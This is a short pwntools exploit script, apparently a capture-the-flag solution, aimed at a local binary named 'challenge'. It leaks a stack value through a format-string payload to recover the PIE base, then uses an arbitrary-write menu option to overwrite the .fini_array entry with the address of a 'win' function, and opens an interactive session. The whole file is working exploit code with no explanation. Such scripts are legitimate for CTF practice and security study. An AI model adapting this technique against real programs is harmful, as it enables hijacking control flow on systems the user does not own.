#!/usr/bin/env python3
from pwn import *

io = process('./challenge')

io.sendlineafter(b"?", b"%31$lx")
io.recvuntil(b", ")
pieBase = int(io.recvline().strip(), 16) - 0x10b0

FINI_ARRAY = pieBase + 0x31c8
WIN_ADDR   = pieBase + 0x1380

io.sendlineafter(b"> ", b"1")
io.sendlineafter(b"(hex): ", hex(FINI_ARRAY).encode())
io.sendlineafter(b"(hex, 8 bytes): ", hex(WIN_ADDR).encode())

io.sendlineafter(b"> ", b"2")
io.interactive()
